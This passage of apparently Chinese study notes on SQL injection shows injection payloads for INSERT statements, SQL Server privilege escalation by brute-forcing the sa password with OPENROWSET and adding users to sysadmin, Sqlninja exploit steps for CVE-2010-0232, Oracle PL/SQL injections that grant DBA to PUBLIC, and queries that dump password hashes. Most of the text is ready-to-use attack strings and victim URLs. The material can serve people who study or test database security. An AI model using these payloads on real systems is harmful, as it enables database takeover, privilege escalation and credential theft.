<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'d'</span> <span class="token operator">+</span><span class="token comment">/**/</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token comment">/**/</span>@<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>显示@@version的第一个字符，/**/绕过空格</p>
<p>转化非整数字符使用ASCII()</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>co12<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="第二种情形：生成INSERT错误"><a href="#第二种情形：生成INSERT错误" class="headerlink" title="第二种情形：生成INSERT错误"></a>第二种情形：生成INSERT错误</h4><p>为了不污染原数据表，执行子查询，使insert失败，返回错误中得到信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>

foo'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> name <span class="token keyword">from</span> users <span class="token keyword">where</span> age<span class="token operator">=</span>@<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>先执行子查询，由于@@version不是数字，报错，不执行insert</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> columnl <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>标量子查询就是只返回单列值而不是多列值或多行的子查询，如果子查询返回一个值或者NULL，外部将执行，返回超过一行就会终止外部查询展示错误信息，所以可以插入两个select</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> @<span class="token variable">@version</span> <span class="token operator">LIKE</span> <span class="token string">'5.1.56%'</span> <span class="token keyword">THEN</span> SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token string">'somevalue'</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'valuel'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'value2'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span><span class="token punctuation">)</span> ALIAS<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>CASE子句检查提取的MySQL版本信息，如果遇到特定的版本，SLEEP命令将执行以延迟5秒的时间。这可以告诉我们MySQL是否是某个特定的版本，同时UNION命令将确保向外部SELECT返回两行数据，从而产生错误。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 插入模板</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'injectable_parameter'</span><span class="token punctuation">)</span>
<span class="token comment">-- 注入参数</span>
<span class="token string">'|| SELECT (SELECT CASE WHEN @@version LIKE '</span><span class="token number">5.1</span><span class="token number">.56</span><span class="token operator">%</span><span class="token string">' THEN SLEEP(5) ELSE '</span>somevalue<span class="token string">' END FROM ((SELECT '</span>valuel<span class="token string">' AS foobar) UNION (SELECT '</span>value2<span class="token string">' AS foobar)) ALIAS) ||'</span>
<span class="token comment">-- 拼接后</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">||</span> <span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> @<span class="token variable">@version</span> <span class="token operator">LIKE</span> <span class="token string">'5.1.56%'</span> <span class="token keyword">THEN</span> SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token string">'somevalue'</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'valuel'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'value2'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span><span class="token punctuation">)</span> ALIAS<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>REGEXP操作符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'a'</span> <span class="token operator">REGEXP</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token operator">&lt;</span>condition<span class="token operator">&gt;</span> <span class="token keyword">THEN</span> <span class="token string">'.*'</span> <span class="token keyword">ELSE</span> <span class="token string">'*'</span> <span class="token keyword">END</span> <span class="token punctuation">(</span><span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'fool'</span> <span class="token keyword">AS</span> bar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'foo2'</span> <span class="token keyword">AS</span> bar<span class="token punctuation">)</span> foobar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果条件(condition)为true, CASE子句将使用有效的正则表达式它将向最外层的 SELECT语句返回两行数据，我们将接收到常见的错误：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR <span class="token number">1242</span> <span class="token punctuation">(</span><span class="token number">21000</span><span class="token punctuation">)</span>: Subquery returns <span class="token function">more</span> than <span class="token number">1</span> row<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果条件为false, REGEXP将采用作为参数，它并不是一个有效的正则表达式， 在这种情况下数据库服务器将返回下列错误：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR <span class="token number">1139</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Got error <span class="token string">'repetition-operator operand invalid'</span> from regexp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?name=';INSERT+INTO+users(id,pass,privs)+VALUES+('test','test',0)-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><p>由于对普通用户存在着限制，要想充分发挥前面介绍的几种攻击的潜力，就必须获取管理员访问权。</p>
<h4 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><code>OPENROWSET</code>作用于SQL Server上，实现对远程OLE DB数据源(例如另一个SQL Server数据库)的一次性连接。DBA可用它来检索远程数据库上的数据，以此作为永久连接(link)两个数 据库的一种手段。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN; Address=10.0.2.2;uid=foo;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT columnl FROM tableA'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上述语句中以用户foo连接到地址为10.0.2.2的SQL Server并执行<code>select column1 from tableA</code>查询，最外层的查询传递并返回该查询的结果。foo是地址为10.0.2.2的数据库的一个用户，而不是首次执行OPENROWSET时的数据库用户。</p>
<p>openrowset可以用来爆破sa提权，有三个要点</p>
<ul>
<li><p>OPENROWSET必须提供执行连接的数据库上的有效凭证。</p>
</li>
<li><p>OPENROWSET不仅可用于连接远程数据库，还可用于执行本地连接；执行本地连接时，使用用户在OPENROWSET调用中指定的权限。</p>
</li>
<li><p>在SQL Server 2000上，所有用户均可调用OPENROWSET;而在SQL Server 2005和 2008上，默认情况下该操作被禁用。但有时会被DBA重新启用</p>
</li>
<li><p>openrowset至少返回一行，所以加个在没有其他会显示是，必须加个<code>select 1</code>，当然也能加其他的</p>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆破sa口令</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=;uid=sa; pwd=foo'</span><span class="token punctuation">,</span><span class="token string">'select 1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>foo是口令的话返回1，不正确返回<code>Login failed for user 'sa'.</code></p>
<p>如果找到了sa口令，可以使用<code>sp_addsrvrolemember</code>储存过程将用户添加至sysadmin组，这样就能提升权限</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;
Address=;uid=sa;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT 1; EXEC
master.dbo.sp_addsrvrolemeniber "appdbuser","sysadmin"'</span><span class="token punctuation">)</span>
<span class="token comment">-- 两个参数appdbuser是用户名，第二个是组名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>注入一个完整的过程，首先构造一个包含OPENROWSET查询和正确用户名的字符串@q，然后通过将@q传递给xp execresultset扩展存储过程（在SQL Server 2000上，所有用户均可调用它）来执行该查询。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@q</span> nvarchar<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">SET</span> <span class="token variable">@q</span> <span class="token operator">=</span> N<span class="token string">'SELECT 1 FROM OPENROWSET（"SQLOLEDB","Network=DBMSSOCN; Address=;uid=sa;pwd=password","SELECT 1; EXEC master.dbo.sp_addsrvrolemember '</span>"<span class="token string">"+system_user+""',""sysadmin"</span>"<span class="token punctuation">)</span><span class="token string">';

EXEC master.dbo.xp_execresultset @q, N'</span>master'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只有目标SQL server启用了混合验证模式，sa才能工作，使用混合验证模式时，Windows用户和SQL Server用户（比如sa）均可通过数据库验证。如果远程数据库服务器上配置的只有Windows验证模式，那么此时只有Windows用户能够访问数据库，sa账户将不可用。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 检测当前使用的哪种模式</span>
<span class="token keyword">select</span> serverproperty<span class="token punctuation">(</span><span class="token string">'IslntegratedSecurityOnly'</span><span class="token punctuation">)</span>
<span class="token comment">-- 如果当前采用的只有Windows验证模式，那么该查询返回1，否则返回0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Sqlninja暴力破解命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlninj a <span class="token parameter variable">-m</span> bruteforce <span class="token parameter variable">-w</span> wordlist.txt
./sqlninj a <span class="token parameter variable">-m</span> fingerprint<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>OPENROWSET 还可用于寻找存在弱口令的SQL Server</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;
Address=10.0.0.1;uid=sa; pwd='</span><span class="token punctuation">,</span><span class="token string">'SELECT 1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 测试openrowset是否可用</span>
<span class="token keyword">select</span> value_in_use <span class="token keyword">from</span> sys<span class="token punctuation">.</span>configurations <span class="token keyword">where</span> name <span class="token operator">LIKE</span> <span class="token string">'Ad Hoc%'</span> 
<span class="token comment">-- 如果OPENROWSET可用，该查询将返回1，否则将返回0。 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="在未打补丁的服务器上提升权限"><a href="#在未打补丁的服务器上提升权限" class="headerlink" title="在未打补丁的服务器上提升权限"></a>在未打补丁的服务器上提升权限</h4><p>如果目标数据库服务器没有更新最新的安全补丁，它就可能会受到一种或多种很有名的攻击。</p>
<p>例子：CVE-2010-0232漏洞</p>
<p>Sqlninja中包含了一个利用该原始漏洞的定制版本的工具。当以sql作为参数来调用该工具时， 它将寻找SQLSERVR.EXE进程并将该进程的权限提升为SYSTEM。为了执行这种攻击，需要 执行下面几个步骤：</p>
<ul>
<li><p>使用 fingerprint 模式(-m fingerprint)检查 xp cmdshell 是否可用(option 3),以及 SQLSERVR. EXE并未以SYSTEM权限运行(option 5)。</p>
</li>
<li><p>使用 upload 模式(-m upload)将 vdmallowed.exe(option 5)和 vdmexploit.dll(叩tion 6)传送到远程服务器。</p>
</li>
<li><p>使用 command 模式(-m command)运行 ‘<code>％TEMP%\\vdmallowed.exe sql</code>， 以执行该漏洞利用工具。</p>
</li>
</ul>
<p>如果远程Windows服务器没有打上针对这一漏洞的补丁，此时fingerprint模式将确认SQL Server真正运行在SYSTEM权限之下。</p>
<h5 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h5><p>如果我们可以访问<code>dbms_xmlquery.newcontext()</code>或<code>dbms_xmlquery.getxml()</code>(默认对于PUBLIC权限可访问)，就可以通过匿名PL/SQL代码块执行注入</p>
<p>不需要PL/SQL注入的一个例子是：使用在Oracle的mod_plsql组件中发现的一个漏洞。 下列URL展示了一种通过driload包提升权限的方法。这个包未被mod_plsql组件过滤，所有Web用户均可通过输入下列URL来提升权限：</p>
<p><a target="_blank" rel="noopener" href="http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC">http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC</a></p>
<p>在利用大多数权限提升漏洞时使用了下列概念：</p>
<ol>
<li>创建一个将DBA权限授权给公共角色的有效载荷。这比将DBA权限授权给指定的用户更隐蔽些。下一步将把该有效载荷注入一个易受攻击的PL/SQL存储过程中。</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> F1 <span class="token keyword">return</span> number
authid <span class="token keyword">current_user</span> <span class="token keyword">as</span>
pragma autonomous_transaction<span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
<span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO PUBLIC'</span>；
<span class="token keyword">COMMIT</span><span class="token punctuation">;</span>
<span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>将该有效载荷注入一个易受攻击的包中：</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sys<span class="token punctuation">.</span>kupw$WORKER<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'YY'' and 1=user12.f1 -- mytagl2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li>启用DBA角色：</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> role DBA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="4">
<li>从公共角色中撤销DBA角色：</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">revoke</span> DBA <span class="token keyword">from</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当前会话虽然仍然拥有DBA权限，但却不再出现在Oracle的权限表中。</p>
<h5 id="SYS-LT"><a href="#SYS-LT" class="headerlink" title="SYS.LT"></a>SYS.LT</h5><p>如果数据库用户具有CREATE PROCEDURE权限，我们就可以在该用户的模式(schema) 中创建一个恶意函数，并在SYS.LT包的一个容易遭受攻击的对象中注入该函数(2009年4月 Oracle已经修正了这一问题)。这一攻击的结果，就是我们的恶意函数在SYS许可权限下获得 执行，并且我们获得了 DBA权限。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建函数</span>
http:<span class="token comment">//www.victim.com/inciex.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate "create or replace function pwn2 return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ""grant dba to public"";commit;return "",1"";END;''; commit; end;') from dual) is not null -- </span>

<span class="token comment">-- 利用 SYS.LT</span>
http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery. newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate "begin SYS.LT.CREATEWORKSPACE(""A10""""" and scott.pwn2()=""""x"");SYS.LT.REMOVEWORKSPACE(""A10"""" and scott.pwn2()=""""x"");end;";commit;end;') from dual) is not null -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="SYS-DBMS-CDC-PUBLISH"><a href="#SYS-DBMS-CDC-PUBLISH" class="headerlink" title="SYS.DBMS_CDC_PUBLISH"></a>SYS.DBMS_CDC_PUBLISH</h4><p>该问题在sys.dbms_cdc_publish.create_change_set包中，该漏洞允许一个具有execute catalog role权限的用户成为DBA</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set(''''a'''',''''a'''',''''a''''''''||SCOTT.pwn2()||''''''''a'''',''''Y'''',sysdate,sysdate);end;'';commit; end;') from dual) is not null--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="绕过-CREATE-PROCEDURE-权限"><a href="#绕过-CREATE-PROCEDURE-权限" class="headerlink" title="绕过 CREATE PROCEDURE 权限"></a>绕过 CREATE PROCEDURE 权限</h5><p>要求具有create procedure权限</p>
<h5 id="cursor注入"><a href="#cursor注入" class="headerlink" title="cursor注入"></a>cursor注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' DECLARE D NUMBER;BEGIN D:= DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(D,''''declare pragma autonomous_transaction; begin execute immediate ''''''''' grant dba to public'''''''';commit;end;'''',0);SYS.LT.CREATEWORKSPACE(''''a''''''' and dbms_sql.execute(''''||D||'''')=1--');SYS.LT.COMPRESSWORKSPACETREE(''''a'''''''' and dbms_sql.execute(''''||D||'''')=1--'''');end;''; commit; end;') from dual) is not null--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="SYS-KUPP-PROC"><a href="#SYS-KUPP-PROC" class="headerlink" title="SYS.KUPP$PROC"></a>SYS.KUPP$PROC</h5><p>SYS.KUPPSPROC.CREATE MASTER PROCESS()函数是另外一个 Oracle 函数，它允许执行任意PL/SQL语句。只有具有DBA角色的用户才能执行该函数。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">' declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.vulnproc(''''a''''''''||sys.kupp$proc.create_master_process(''''''''EXECUTE IMMEDIATE''''''''''''''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE
''''''''''''''''''''''''''''''''GR ANT DBA TO PUBLIC'''''''''''''''''''''''''''''''';END;'''''''''''''''''''''''''''''''';'''''''')||''''''''a'''');end; ''; commit; end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="弱许可权限"><a href="#弱许可权限" class="headerlink" title="弱许可权限"></a>弱许可权限</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">VIEW</span>
<span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">TRIGGER</span>
<span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">PROCEDURE</span>
<span class="token keyword">EXECUTE</span> <span class="token keyword">ANY</span> <span class="token keyword">PROCEDURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这些权限间接地允许权限提升攻击。</p>
<p>使用<code>CREATE ANY TRIGGER</code>提升权限</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">'declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' create or replace trigger "SYSTEM". the_trigger before insert on system.OL$ for each row declare pragma autonomous_transaction; BEGIN execute immediate ''''GRANT DBA TO PUBLIC''''; END the_trigger;'';end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="窃取哈希口令"><a href="#窃取哈希口令" class="headerlink" title="窃取哈希口令"></a>窃取哈希口令</h3><h4 id="SQL-Server-2"><a href="#SQL-Server-2" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>不同版本，差别很大，都需要管理员权限才能访问哈希口令表</p>
<h5 id="SQL-Server-2000"><a href="#SQL-Server-2000" class="headerlink" title="SQL Server 2000"></a>SQL Server 2000</h5><p>哈希口令储存在master数据库的sysxlogins表中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>password <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysxlogins <span class="token comment">-- 检索</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由pwdencrypt()函数生成，哈希值由头，salt，区分大小写的哈希，不区分大小写的哈希组成</p>
<h5 id="SQL-Server-2005-2008"><a href="#SQL-Server-2005-2008" class="headerlink" title="SQL Server 2005,2008"></a>SQL Server 2005,2008</h5><p>sysxlogins不存在了，移除了不区分大小写的哈希</p>
<p>通过查询sql_logins视图检索哈希口令</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> password_hash <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用fh_varbintohexstr()函数将哈希值显式地强制转换为十六进制字符串</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_hash)+from+sys.sql_logins+where+name+=+'sa'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span>
<span class="token comment">-- 检索哈希口令，哈希口令由password()函数产生，算法随版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="PostgreSQL-2"><a href="#PostgreSQL-2" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>如果刚好具有administrative权限，就可以访问pg_shadow表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> usename<span class="token punctuation">,</span> passwd <span class="token keyword">FROM</span> pg_shadow
<span class="token keyword">SELECT</span> rolname<span class="token punctuation">,</span> rolpassword <span class="token keyword">FROM</span> pg_authid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

